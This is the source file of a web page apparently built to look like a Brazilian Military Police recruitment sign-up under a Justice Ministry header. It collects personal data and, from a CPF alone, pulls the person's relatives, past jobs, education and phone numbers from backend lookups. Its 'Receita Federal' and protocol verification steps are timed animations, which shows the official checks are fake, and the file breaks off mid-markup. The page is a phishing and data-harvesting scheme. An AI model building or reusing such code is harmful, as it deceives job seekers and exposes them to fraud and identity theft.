import { useState, useEffect, useRef } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Loader2, CheckCircle, AlertCircle, Shield, FileCheck, MapPin, Users } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { useLocation } from "wouter";
import { useClarityEvents } from "@/hooks/use-clarity-events";
import { useEstadoPM } from '@/hooks/useEstadoPM';
import { getBrasaoUrl } from '@/utils/estadoPM';
import { buscarCep } from "@/lib/cepFinder";


// Schema de validação
const digitos = (v: string) => v.replace(/\D/g, '');

const capturaSchema = z.object({
  cpf: z.string()
    .min(1, "Informe seu CPF")
    .refine((v) => digitos(v).length === 11, "CPF incompleto — confira se digitou os 11 números"),

  nomeCompleto: z.string()
    .min(1, "Informe seu nome")
    .refine((v) => v.trim().split(/\s+/).length >= 2, "Digite seu nome e sobrenome"),

  dataAniversario: z.string()
    .min(1, "Informe sua data de nascimento")
    .refine((v) => /^\d{4}-\d{2}-\d{2}$/.test(v), "Data inválida")
    // Monta a data por partes: new Date('2006-12-13') é lido como UTC e
    // vira dia 12 no fuso do Brasil.
    .refine((v) => {
      const [a, m, d] = v.split('-').map(Number);
      const data = new Date(a, m - 1, d);
      return data.getFullYear() === a && data.getMonth() === m - 1 && data.getDate() === d;
    }, "Essa data não existe — confira o dia e o mês")
    .refine((v) => {
      const [a, m, d] = v.split('-').map(Number);
      return new Date(a, m - 1, d) <= new Date();
    }, "A data de nascimento não pode ser no futuro"),

  genero: z.enum(["masculino", "feminino", "outro"], {
    errorMap: () => ({ message: "Selecione uma opção" }),
  }),

  telefone: z.string()
    .min(1, "Informe seu telefone")
    .refine((v) => digitos(v).length === 11, "Telefone incompleto — inclua o DDD e os 9 números"),

  email: z.string()
    .min(1, "Informe seu e-mail")
    .email("E-mail inválido — o formato é nome@email.com"),

  cep: z.string()
    .min(1, "Informe seu CEP")
    .refine((v) => digitos(v).length === 8, "CEP incompleto — são 8 números"),

  logradouro: z.string().optional(),
  numero: z.string().optional(),
  complemento: z.string().optional(),

  bairro: z.string().min(1, "Informe o bairro"),
  cidade: z.string().min(1, "Informe a cidade"),

  // preprocess normaliza o que vem do autopreenchimento (ex: "sp ") antes do enum validar
  uf: z.string().min(2, "Selecione o estado"),
});


type CapturaFormData = z.infer<typeof capturaSchema>;

// Domínios de email mais comuns no Brasil
const commonEmailDomains = [
  "gmail.com",
  "hotmail.com",
  "outlook.com",
  "yahoo.com.br",
  "uol.com.br",
  "bol.com.br",
  "terra.com.br",
  "ig.com.br",
  "live.com",
  "icloud.com",
  "msn.com",
  "yahoo.com",
  "globomail.com",
  "r7.com"
];

// Etapas do processo de validação
const validationSteps = [
  {
    id: 1,
    title: "Verificação de identidade",
    description: "Consultando CPF junto à Receita Federal do Brasil",
    icon: Shield,
    duration: 2000
  },
  {
    id: 2,
    title: "Consulta cadastral",
    description: "Verificando elegibilidade no cadastro nacional de concursos",
    icon: FileCheck,
    duration: 1500
  },
  {
    id: 3,
    title: "Identificação de unidades de prova",
    description: "Localizando locais de aplicação conforme endereço informado",
    icon: MapPin,
    duration: 1800
  },
  {
    id: 4,
    title: "Registro do protocolo de inscrição",
    description: "Gerando número de protocolo e confirmando candidatura",
    icon: Users,
    duration: 1200
  }
];

export default function CapturaPage() {
  const estadoPM = useEstadoPM();
  const sigla      = estadoPM?.sigla ?? 'PM';
  const editalSlug = estadoPM ? `Edital ${sigla} 2026` : 'Edital PM 2026';
  const nomeCorpo  = estadoPM?.nomeCompleto ?? 'Polícia Militar';
  const brasaoUrl  = getBrasaoUrl(estadoPM);

  const [isValidatingCpf, setIsValidatingCpf] = useState(false);
  const [cpfValidated, setCpfValidated] = useState(false);
  const [autoFilledData, setAutoFilledData] = useState<any>(null);
  const [emailSuggestions, setEmailSuggestions] = useState<string[]>([]);
  const [showEmailSuggestions, setShowEmailSuggestions] = useState(false);
  const [selectedSuggestionIndex, setSelectedSuggestionIndex] = useState(-1);
  const [phoneNumbers, setPhoneNumbers] = useState<any[]>([]);
  const [phoneSuggestions, setPhoneSuggestions] = useState<any[]>([]);
  const [showPhoneSuggestions, setShowPhoneSuggestions] = useState(false);
  const [selectedPhoneSuggestionIndex, setSelectedPhoneSuggestionIndex] = useState(-1);
  const [isValidatingCep, setIsValidatingCep] = useState(false);
  const [cepValidated, setCepValidated] = useState(false);
  const [locaisProva, setLocaisProva] = useState<any[]>([]);
  const [showLocaisInfo, setShowLocaisInfo] = useState(false);
  const [showLoader, setShowLoader] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const emailInputRef = useRef<HTMLInputElement>(null);
  const [showWomenPriority, setShowWomenPriority] = useState(false);
  const [ageValidated, setAgeValidated] = useState(false);
  const [termVerdadeiros, setTermVerdadeiros] = useState(false);
  const [termLgpd, setTermLgpd] = useState(false);
  const [termEdital, setTermEdital] = useState(false);
  const allTermsAccepted = termVerdadeiros && termLgpd && termEdital;
  const [candidateAge, setCandidateAge] = useState<number | null>(null);
  const [empregosAntigos, setEmpregosAntigos] = useState<string[]>([]);
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { 
    trackGenderSelection, 
    trackFormFieldCompleted, 
    trackCEPSearch, 
    trackAgeRange,
    trackSuccessfulSubmission,
    trackDropoff,
    trackEvent
  } = useClarityEvents();

  // Scroll para o topo quando a página carrega
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  // Função para buscar dados de escolaridade de forma assíncrona
  const fetchEscolaridadeData = async (cpf: string) => {
    try {
      const response = await fetch(`/api/escolaridade-extra/${cpf}`);
      const result = await response.json();
      
      if (result.success && result.data?.escolaridade) {
        // Salvar dados de escolaridade no localStorage
        localStorage.setItem('escolaridadeData', JSON.stringify(result.data.escolaridade));
        console.log('Dados de escolaridade salvos:', result.data.escolaridade);
      } else {
        // Salvar null se não houver dados de escolaridade
        localStorage.setItem('escolaridadeData', JSON.stringify(null));
        console.log('Nenhum dado de escolaridade encontrado');
      }
    } catch (error) {
      console.error('Erro ao buscar dados de escolaridade:', error);
      // Salvar null em caso de erro
      localStorage.setItem('escolaridadeData', JSON.stringify(null));
    }
  };

  // Função para buscar empregos antigos de forma assíncrona
  const fetchEmpregosAntigos = async (cpf: string) => {
    try {
      const response = await fetch(`/api/empregos-antigos/${cpf}`);
      const result = await response.json();
      
      if (result.success && result.data?.empregos && result.data.empregos.length > 0) {
        setEmpregosAntigos(result.data.empregos);
        console.log('Empregos antigos encontrados:', result.data.empregos);
      } else {
        setEmpregosAntigos([]);
        console.log('Nenhum emprego anterior encontrado');
      }
    } catch (error) {
      console.error('Erro ao buscar empregos antigos:', error);
      setEmpregosAntigos([]);
    }
  };

  // Função para buscar telefones de forma assíncrona
  const fetchPhoneNumbers = async (cpf: string) => {
    try {
      // Primeiro, tentar extrair telefones da API extras
      const dadosExtrasString = localStorage.getItem('dados-extras');
      let telefonesExtras: any[] = [];
      
      if (dadosExtrasString) {
        try {
          const dadosExtras = JSON.parse(dadosExtrasString);
          if (dadosExtras?.telefones && Array.isArray(dadosExtras.telefones) && dadosExtras.telefones.length > 0) {
            // Processar telefones da API extras
            telefonesExtras = dadosExtras.telefones.map((telefoneObj: any) => {
              const numeroTelefone = telefoneObj.telefone?.trim();
              if (numeroTelefone && numeroTelefone !== 'INDEFINIDO' && numeroTelefone.length >= 8) {
                // Corrigir formato do número se necessário
                let numeroCorrigido = numeroTelefone;
                
                // Se o número tem 10 dígitos e não começa com 9 após o DDD, adicionar o 9
                if (numeroTelefone.length === 10 && numeroTelefone[2] !== '9') {
                  numeroCorrigido = numeroTelefone.substring(0, 2) + '9' + numeroTelefone.substring(2);
                }
                
                // Formatar o telefone para melhor legibilidade
                let numeroFormatado = numeroCorrigido;
                if (numeroCorrigido.length === 11) {
                  // Celular: (XX) 9XXXX-XXXX
                  numeroFormatado = `(${numeroCorrigido.substring(0,2)}) ${numeroCorrigido.substring(2,7)}-${numeroCorrigido.substring(7)}`;
                } else if (numeroCorrigido.length === 10) {
                  // Fixo: (XX) XXXX-XXXX
                  numeroFormatado = `(${numeroCorrigido.substring(0,2)}) ${numeroCorrigido.substring(2,6)}-${numeroCorrigido.substring(6)}`;
                }

                return {
                  numero: numeroCorrigido,
                  numero_formatado: numeroFormatado,
                  tipo: telefoneObj.tipo || 'Não informado',
                  operadora: telefoneObj.operadora || 'Não informada',
                  fonte: 'api_extras'
                };
              }
              return null;
            }).filter(Boolean);
            
            console.log('Telefones extraídos da API extras:', telefonesExtras.length);
          }
        } catch (parseError) {
          console.error('Erro ao processar dados extras para telefones:', parseError);
        }
      }
      
      // Se encontrou telefones na API extras, usar eles
      if (telefonesExtras.length > 0) {
        setPhoneNumbers(telefonesExtras);
        console.log('Usando telefones da API extras:', telefonesExtras.length);
        return;
      }
      
      // Fallback: usar a API de telefones atual se não encontrou na API extras
      console.log('Telefones não encontrados na API extras, usando API de telefones como fallback');
      const response = await fetch(`/api/telefones/${cpf}`);
      const result = await response.json();
      
      if (result.success && result.data?.telefones && result.data.telefones.length > 0) {
        // Adicionar fonte aos telefones da API fallback
        const telefonesComFonte = result.data.telefones.map((tel: any) => ({
          ...tel,
          fonte: 'api_telefones'
        }));
        setPhoneNumbers(telefonesComFonte);
        console.log('Telefones encontrados via API fallback:', telefonesComFonte.length);
      } else {
        setPhoneNumbers([]);
        console.log('Nenhum telefone encontrado em ambas as APIs');
      }
    } catch (error) {
      console.error('Erro ao buscar telefones:', error);
      setPhoneNumbers([]);
    }
  };

  // Função para buscar dados de parentesco de forma assíncrona
  const fetchParentescoData = async (cpf: string) => {
    try {
      const response = await fetch(`/api/parentesco/${cpf}`);
      const result = await response.json();
      
      if (result.success && result.data?.parentesco && result.data.parentesco.length > 0) {
        // Salvar dados de parentesco no localStorage
        localStorage.setItem('parentescoData', JSON.stringify(result.data.parentesco));
        console.log('Dados de parentesco salvos:', result.data.parentesco.length);
      } else {
        // Salvar array vazio se não houver dados de parentesco
        localStorage.setItem('parentescoData', JSON.stringify([]));
        console.log('Nenhum dado de parentesco encontrado');
      }
    } catch (error) {
      console.error('Erro ao buscar dados de parentesco:', error);
      // Salvar array vazio em caso de erro
      localStorage.setItem('parentescoData', JSON.stringify([]));
    }
  };

  // Função para buscar dados extras de forma assíncrona
  const fetchDadosExtras = async (cpf: string) => {
    try {
      const response = await fetch(`/api/extras/${cpf}`);
      const result = await response.json();
      
      if (result.success && result.data) {
        // Salvar dados extras no localStorage
        localStorage.setItem('dados-extras', JSON.stringify(result.data));
        console.log('Dados extras salvos:', Object.keys(result.data).length, 'campos');
      } else {
        // Salvar objeto vazio se não houver dados extras
        localStorage.setItem('dados-extras', JSON.stringify({}));
        console.log('Nenhum dado extra encontrado');
      }
    } catch (error) {
      console.error('Erro ao buscar dados extras:', error);
      // Salvar objeto vazio em caso de erro
      localStorage.setItem('dados-extras', JSON.stringify({}));
    }
  };

  const form = useForm<CapturaFormData>({
    resolver: zodResolver(capturaSchema),
    defaultValues: {
      cpf: "",
      nomeCompleto: "",
      dataAniversario: "",
      genero: undefined,
      telefone: "",
      email: "",
      cep: "",
      logradouro: "",
      numero: "",
      complemento: "",
      bairro: "",
      cidade: "",
      uf: ""
    }
  });

  const watchedValues = form.watch();
  // Validações auxiliares reutilizadas em formFilled e pendingFields
  const emailValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(watchedValues.email ?? '');
  const telefoneDigitos = (watchedValues.telefone ?? '').replace(/\D/g, '').length;

  const formFilled = cpfValidated &&
    (watchedValues.nomeCompleto?.trim().length ?? 0) >= 2 &&
    (watchedValues.dataAniversario?.trim().length ?? 0) >= 10 &&
    !!watchedValues.genero &&
    telefoneDigitos === 11 &&
    emailValido &&
    (watchedValues.cep?.trim().length ?? 0) >= 8 &&
    (watchedValues.logradouro?.trim().length ?? 0) >= 5 &&
    (watchedValues.numero?.trim().length ?? 0) >= 1 &&
    (watchedValues.bairro?.trim().length ?? 0) >= 2 &&
    (watchedValues.cidade?.trim().length ?? 0) >= 2 &&
    (watchedValues.uf?.trim().length ?? 0) >= 2;

  // Campos pendentes para o texto dinâmico do botão
  const pendingFields: string[] = [];
  if (!cpfValidated) pendingFields.push('CPF');
  if ((watchedValues.nomeCompleto?.trim().length ?? 0) < 2) pendingFields.push('nome completo');
  if ((watchedValues.dataAniversario?.trim().length ?? 0) < 10) pendingFields.push('data de nascimento');
  if (!watchedValues.genero) pendingFields.push('gênero');
  if (telefoneDigitos !== 11) pendingFields.push('telefone');
  if (!emailValido) pendingFields.push('e-mail');
  if ((watchedValues.cep?.trim().length ?? 0) < 8) pendingFields.push('CEP');
  if ((watchedValues.logradouro?.trim().length ?? 0) < 5) pendingFields.push('logradouro');
  if ((watchedValues.numero?.trim().length ?? 0) < 1) pendingFields.push('número');
  if ((watchedValues.bairro?.trim().length ?? 0) < 2) pendingFields.push('bairro');
  if ((watchedValues.cidade?.trim().length ?? 0) < 2) pendingFields.push('cidade');
  if ((watchedValues.uf?.trim().length ?? 0) < 2) pendingFields.push('UF');

  const submitButtonText = (() => {
    if (pendingFields.length > 0) {
      const shown = pendingFields.slice(0, 3);
      const rest = pendingFields.length - shown.length;
      const lista = shown.join(', ');
      return rest > 0 ? `Preencha: ${lista} e mais ${rest}` : `Preencha: ${lista}`;
    }
    if (!allTermsAccepted) return 'Aceite os termos para prosseguir';
    return 'Prosseguir com a Inscrição';
  })();

  // Função para formatar CPF
  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  // Função para formatar telefone - formato (XX) 9XXXX-XXXX
  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    // Limita a 11 dígitos
    const limitedNumbers = numbers.slice(0, 11);
    
    // Formata como (XX) 9XXXX-XXXX
    if (limitedNumbers.length <= 2) {
      return limitedNumbers;
    } else if (limitedNumbers.length <= 7) {
      return `(${limitedNumbers.slice(0, 2)}) ${limitedNumbers.slice(2)}`;
    } else {
      return `(${limitedNumbers.slice(0, 2)}) ${limitedNumbers.slice(2, 7)}-${limitedNumbers.slice(7)}`;
    }
  };

  // Função para formatar CEP
  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.replace(/(\d{5})(\d{3})/, '$1-$2');
  };

  // Função para validar CEP e buscar endereço
  const validateCep = async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, '');
    
    if (cleanCep.length !== 8) {
      return false;
    }

    setIsValidatingCep(true);
    
    try {
      // Buscar dados do CEP via ViaCEP
      const endereco = await buscarCep(cleanCep) as any;

      form.setValue('logradouro', endereco.logradouro);
      form.setValue('bairro', endereco.bairro);
      form.setValue('cidade', endereco.cidade);
      form.setValue('uf', endereco.uf);

      setCepValidated(true);

      return true;
    } catch (error) {
      toast({
        title: "CEP não encontrado",
        description: "Verifique o CEP informado ou preencha o endereço manualmente",
        variant: "destructive"
      });
      return false;
    } finally {
      setIsValidatingCep(false);
    }
  };

  // Função para gerar sugestões de email
  const generateEmailSuggestions = (value: string) => {
    if (!value.includes('@')) return [];
    
    const [localPart, domainPart] = value.split('@');
    if (!localPart || domainPart === undefined) return [];
    
    // Se já digitou um domínio completo, não mostrar sugestões
    if (domainPart.length > 0 && commonEmailDomains.includes(domainPart)) {
      return [];
    }
    
    // Filtrar domínios que começam com o que foi digitado
    const matchingDomains = commonEmailDomains.filter(domain => 
      domain.toLowerCase().startsWith(domainPart.toLowerCase())
    );
    
    // Retornar emails completos
    return matchingDomains.slice(0, 5).map(domain => `${localPart}@${domain}`);
  };

  // Função para lidar com teclas no campo de email
  const handleEmailKeyDown = (e: React.KeyboardEvent, field: any) => {
    if (!showEmailSuggestions || emailSuggestions.length === 0) return;

    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setSelectedSuggestionIndex(prev => 
          prev < emailSuggestions.length - 1 ? prev + 1 : prev
        );
        break;
      case 'ArrowUp':
        e.preventDefault();
        setSelectedSuggestionIndex(prev => prev > 0 ? prev - 1 : 0);
        break;
      case 'Enter':
        if (selectedSuggestionIndex >= 0) {
          e.preventDefault();
          field.onChange(emailSuggestions[selectedSuggestionIndex]);
          setShowEmailSuggestions(false);
          setSelectedSuggestionIndex(-1);
        }
        break;
      case 'Escape':
        setShowEmailSuggestions(false);
        setSelectedSuggestionIndex(-1);
        break;
    }
  };

  // Função para selecionar sugestão
  const selectEmailSuggestion = (suggestion: string, field: any) => {
    field.onChange(suggestion);
    setShowEmailSuggestions(false);
    setSelectedSuggestionIndex(-1);
    emailInputRef.current?.focus();
  };

  // Função para detectar tipo de telefone
  const detectPhoneType = (numero: string) => {
    const cleanNumber = numero.replace(/\D/g, '');
    // Se tem 11 dígitos e o terceiro dígito é 9, é celular
    if (cleanNumber.length === 11 && cleanNumber[2] === '9') {
      return 'celular';
    }
    // Se tem 10 dígitos, é fixo
    if (cleanNumber.length === 10) {
      return 'fixo';
    }
    // Para outros casos, assumir celular se tem 11 dígitos
    return cleanNumber.length === 11 ? 'celular' : 'fixo';
  };

  // Função para gerar sugestões de telefone
  const generatePhoneSuggestions = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    console.log('Gerando sugestões para:', numbers, 'Total telefones disponíveis:', phoneNumbers.length);
    
    if (numbers.length < 2 || phoneNumbers.length === 0) {
      console.log('Muito poucos dígitos ou nenhum telefone disponível');
      return [];
    }
    
    // Filtrar telefones que começam com os números digitados
    const matchingSuggestions = phoneNumbers.filter(phone => {
      const match = phone.numero.startsWith(numbers);
      console.log(`Comparando ${phone.numero} com ${numbers}:`, match);
      return match;
    }).map(phone => ({
      ...phone,
      tipo: detectPhoneType(phone.numero) // Adicionar tipo detectado
    }));
    
    console.log('Sugestões encontradas:', matchingSuggestions.length);
    return matchingSuggestions.slice(0, 5);
  };

  // Função para lidar com teclas no campo de telefone
  const handlePhoneKeyDown = (e: React.KeyboardEvent, field: any) => {
    if (!showPhoneSuggestions || phoneSuggestions.length === 0) return;

    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setSelectedPhoneSuggestionIndex(prev => 
          prev < phoneSuggestions.length - 1 ? prev + 1 : prev
        );
        break;
      case 'ArrowUp':
        e.preventDefault();
        setSelectedPhoneSuggestionIndex(prev => prev > 0 ? prev - 1 : 0);
        break;
      case 'Enter':
        if (selectedPhoneSuggestionIndex >= 0) {
          e.preventDefault();
          const selectedPhone = phoneSuggestions[selectedPhoneSuggestionIndex];
          field.onChange(selectedPhone.numero_formatado);
          setShowPhoneSuggestions(false);
          setSelectedPhoneSuggestionIndex(-1);
        }
        break;
      case 'Escape':
        setShowPhoneSuggestions(false);
        setSelectedPhoneSuggestionIndex(-1);
        break;
    }
  };

  // Função para selecionar sugestão de telefone
  const selectPhoneSuggestion = (phone: any, field: any) => {
    // Use the formatted number from the API response
    field.onChange(phone.numero_formatado);
    setShowPhoneSuggestions(false);
    setSelectedPhoneSuggestionIndex(-1);
  };

  // Função para obter o logo da operadora
  const getOperatorLogo = (operadora: string) => {
    const operator = operadora.toUpperCase();
    switch (operator) {
      case 'VIVO':
        return 'https://upload.wikimedia.org/wikipedia/commons/7/70/Logo_VIVO.svg';
      case 'OI':
        return 'https://upload.wikimedia.org/wikipedia/commons/a/aa/Oi_logo_2022.png';
      case 'TIM':
        return 'https://upload.wikimedia.org/wikipedia/commons/0/02/TIM_logo_%282016-present%29.svg';
      case 'CLARO':
        return 'https://upload.wikimedia.org/wikipedia/commons/0/0c/Claro.svg';
      default:
        return null;
    }
  };

  // Função para validar CPF
  const validateCpf = async (cpf: string) => {
    const cleanCpf = cpf.replace(/\D/g, '');
    
    if (cleanCpf.length !== 11) {
      return false;
    }

    setIsValidatingCpf(true);
    
    try {
      const response = await fetch('/api/validate-cpf', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cpf: cleanCpf })
      });

      const result = await response.json();
      
      if (result.success && result.data?.DADOS) {
        const dados = result.data.DADOS;
        
        // Auto preencher campos
        form.setValue('nomeCompleto', dados.nome || '');
        
        // Converter data de nascimento se disponível
        if (dados.data_nascimento || dados.nascimento) {
          const dataNasc = dados.data_nascimento || dados.nascimento;
          
          // Converter diferentes formatos para YYYY-MM-DD
          if (dataNasc.includes('/')) {
            // Formato DD/MM/YYYY
            const [dia, mes, ano] = dataNasc.split('/');
            form.setValue('dataAniversario', `${ano}-${mes.padStart(2, '0')}-${dia.padStart(2, '0')}`);
          } else if (dataNasc.includes('-') && dataNasc.includes(' ')) {
            // Formato "2006-12-13 00:00:00"
            const dateOnly = dataNasc.split(' ')[0];
            form.setValue('dataAniversario', dateOnly);
          } else if (dataNasc.includes('-') && dataNasc.length >= 10) {
            // Formato YYYY-MM-DD direto
            form.setValue('dataAniversario', dataNasc.substring(0, 10));
          }
        }
        
        // Definir gênero baseado no sexo
        if (dados.sexo) {
          const sexo = dados.sexo.toLowerCase();
          if (sexo === 'm' || sexo === 'masculino') {
            form.setValue('genero', 'masculino');
            trackGenderSelection('masculino', 'captura_page_autofill');
          } else if (sexo === 'f' || sexo === 'feminino') {
            form.setValue('genero', 'feminino');
            trackGenderSelection('feminino', 'captura_page_autofill');
          }
        }

        setAutoFilledData(dados);
        setCpfValidated(true);
        
        // Salvar no localStorage
        const userData = {
          cpf: cleanCpf,
          ...dados,
          validatedAt: new Date().toISOString()
        };
        localStorage.setItem('userData', JSON.stringify(userData));
        
        // Consulta assíncrona para dados extras primeiro (para ter dados completos)
        fetchDadosExtras(cleanCpf).then(() => {
          // Depois que dados extras são salvos, buscar telefones (que vai usar os dados extras)
          fetchPhoneNumbers(cleanCpf);
        });
        
        return true;
      } else {
        toast({
          title: "CPF não encontrado",
          description: "Verifique o CPF informado ou preencha os dados manualmente",
          variant: "destructive"
        });
        return false;
      }
    } catch (error) {
      toast({
        title: "Erro na validação",
        description: "Erro ao validar CPF. Preencha os dados manualmente.",
        variant: "destructive"
      });
      return false;
    } finally {
      setIsValidatingCpf(false);
    }
  };

  // Monitorar mudanças no CPF
  const watchCpf = form.watch('cpf');
  
  useEffect(() => {
    const cleanCpf = watchCpf?.replace(/\D/g, '') || '';
    if (cleanCpf.length === 11 && !cpfValidated) {
      validateCpf(cleanCpf);
    }
  }, [watchCpf]);

  // Monitorar mudanças no CEP
  const watchCep = form.watch('cep');
  
  useEffect(() => {
    const cleanCep = watchCep?.replace(/\D/g, '') || '';
    if (cleanCep.length === 8 && !cepValidated) {
      validateCep(cleanCep);
    }
  }, [watchCep]);

  // Função para calcular idade
  const calculateAge = (birthDate: string): number => {
    const today = new Date();
    const birth = new Date(birthDate);
    let age = today.getFullYear() - birth.getFullYear();
    const monthDiff = today.getMonth() - birth.getMonth();
    
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
      age--;
    }
    
    return age;
  };

  // Monitorar mudanças no gênero para mostrar informações de prioridade feminina
  const watchGenero = form.watch('genero');
  const watchDataAniversario = form.watch('dataAniversario');
  
  useEffect(() => {
    if (watchGenero === 'feminino') {
      setShowWomenPriority(true);
    } else {
      setShowWomenPriority(false);
    }
  }, [watchGenero]);

  // Monitorar mudanças na data de nascimento para validar idade
  useEffect(() => {
    if (watchDataAniversario && cpfValidated) {
      const age = calculateAge(watchDataAniversario);
      setCandidateAge(age);
      // Track age range for analytics
      trackAgeRange(watchDataAniversario, 'captura_page');
      // Sempre considera idade válida (conforme solicitado)
      setAgeValidated(true);
    } else {
      setAgeValidated(false);
      setCandidateAge(null);
    }
  }, [watchDataAniversario, cpfValidated]);

  // Função para executar as etapas de validação
  const runValidationSteps = async () => {
    for (let i = 0; i < validationSteps.length; i++) {
      const step = validationSteps[i];
      setCurrentStep(i);
      
      // Simular processamento da etapa
      await new Promise(resolve => setTimeout(resolve, step.duration));
      
      // Marcar etapa como concluída
      setCompletedSteps(prev => [...prev, step.id]);
    }
    
    // Aguardar um pouco antes de redirecionar
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Redirecionar para /terms
    setLocation('/pessoal');
  };

  // Função para fazer scroll para o primeiro campo com erro
  const scrollToFirstError = () => {
    const errors = form.formState.errors;
    const fieldOrder = [
      'cpf', 'nomeCompleto', 'dataAniversario', 'genero', 'telefone', 'email',
      'cep', 'logradouro', 'numero', 'bairro', 'cidade', 'uf'
    ];
    
    for (const fieldName of fieldOrder) {
      if (errors[fieldName as keyof typeof errors]) {
        const element = document.querySelector(`[name="${fieldName}"]`) || 
                       document.querySelector(`[data-field="${fieldName}"]`);
        if (element) {
          element.scrollIntoView({ 
            behavior: 'smooth', 
            block: 'center',
            inline: 'nearest'
          });
          // Adicionar destaque visual temporário
          element.classList.add('ring-2', 'ring-red-500', 'ring-opacity-50');
          setTimeout(() => {
            element.classList.remove('ring-2', 'ring-red-500', 'ring-opacity-50');
          }, 3000);
          break;
        }
      }
    }
  };

  // Função para confirmar dados
  const onSubmit = async (data: CapturaFormData) => {
    // Facebook Pixel - Lead event
    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'Lead', {
        content_name: 'Dados Pessoais Preenchidos',
        content_category: 'Registration Form',
        value: 6893.00,
        currency: 'BRL'
      });
    }

    const finalData = {
      ...data,
      cpf: data.cpf.replace(/\D/g, ''),
      telefone: data.telefone.replace(/\D/g, ''),
      cep: data.cep.replace(/\D/g, ''),
      autoFilledData,
      locaisProva,
      confirmedAt: new Date().toISOString()
    };

    // Track successful form submission
    trackSuccessfulSubmission('captura_page', finalData);
    
    // Salvar dados finais no localStorage
    localStorage.setItem('userData', JSON.stringify(finalData));
    
    // Mostrar loader e iniciar processo de validação
    setShowLoader(true);
    setCurrentStep(0);
    setCompletedSteps([]);
    
    // Executar etapas de validação
    await runValidationSteps();
  };

  // Função para lidar com erros de validação
  const onInvalidSubmit = () => {
    setTimeout(() => {
      scrollToFirstError();
    }, 100);
  };

  // Componente do Loader — Protocolo de Inscrição
  const ValidationLoader = () => {
    const completedCount = completedSteps.length;
    return (
    <div className="fixed inset-0 flex items-center justify-center z-50" style={{ backgroundColor: 'rgba(0,0,0,0.6)' }}>
      <div style={{
        background: '#fff',
        width: '100%',
        maxWidth: 460,
        margin: '0 16px',
        borderTop: '4px solid #1351b4',
        boxShadow: '0 8px 32px rgba(0,0,0,0.18)',
        fontFamily: 'Rawline, Arial, sans-serif',
      }}>
        {/* Header institucional */}
        <div style={{ padding: '20px 24px 16px', borderBottom: '1px solid #e5e7eb' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <img src={brasaoUrl} alt="Brasão" style={{ height: 36, objectFit: 'contain', flexShrink: 0 }} />
            <div>
              <div style={{ fontSize: 13, fontWeight: 700, color: '#1351b4', textTransform: 'uppercase', letterSpacing: '0.06em' }}>
                Ministério da Justiça e Segurança Pública
              </div>
              <div style={{ fontSize: 11, color: '#666', marginTop: 1 }}>
                {editalSlug} · Protocolo de Inscrição
              </div>
            </div>
          </div>
        </div>

        {/* Barra de progresso */}
        <div style={{ background: '#f3f4f6', height: 3, position: 'relative' }}>
          <div style={{
            position: 'absolute', top: 0, left: 0, height: '100%',
            width: `${(completedCount / validationSteps.length) * 100}%`,
            backgroundColor: '#268744',
            transition: 'width 0.6s ease',
          }} />
        </div>

        {/* Etapas */}
        <div style={{ padding: '8px 0' }}>
          {validationSteps.map((step, index) => {
            const isActive = currentStep === index;
            const isCompleted = completedSteps.includes(step.id);
            const isPending = !isActive && !isCompleted;

            return (
              <div key={step.id} style={{
                display: 'flex',
                alignItems: 'center',
                gap: 14,
                padding: '10px 24px',
                borderBottom: index < validationSteps.length - 1 ? '1px solid #f3f4f6' : 'none',
                background: isActive ? '#f8faff' : 'transparent',
                transition: 'background 0.3s',
              }}>
                {/* Número / status */}
                <div style={{
                  width: 28,
                  height: 28,
                  flexShrink: 0,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: 11,
                  fontWeight: 700,
                  border: `1.5px solid ${isCompleted ? '#268744' : isActive ? '#1351b4' : '#d1d5db'}`,
                  background: isCompleted ? '#268744' : isActive ? '#1351b4' : 'transparent',
                  color: isCompleted || isActive ? '#fff' : '#9ca3af',
                  position: 'relative',
                }}>
                  {isCompleted ? '✓' : isActive ? (
                    <Loader2 style={{ width: 13, height: 13, animation: 'spin 1s linear infinite' }} />
                  ) : index + 1}
                </div>

                {/* Texto */}
                <div style={{ flex: 1 }}>
                  <div style={{
                    fontSize: 13,
                    fontWeight: isActive ? 700 : 500,
                    color: isCompleted ? '#1a5e30' : isActive ? '#0c326f' : '#9ca3af',
                    letterSpacing: '0.01em',
                  }}>
                    {step.title}
                  </div>
                  <div style={{
                    fontSize: 11,
                    color: isCompleted ? '#4ade80' : isActive ? '#555' : '#c4c9d0',
                    marginTop: 1,
                  }}>
                    {isCompleted ? 'Concluído' : isActive ? step.description : 'Aguardando'}
                  </div>
                </div>

                {/* Status tag */}
                {isCompleted && (
                  <span style={{ fontSize: 10, fontWeight: 700, color: '#1a7a3a', letterSpacing: '0.05em', textTransform: 'uppercase' }}>OK</span>
                )}
                {isActive && (
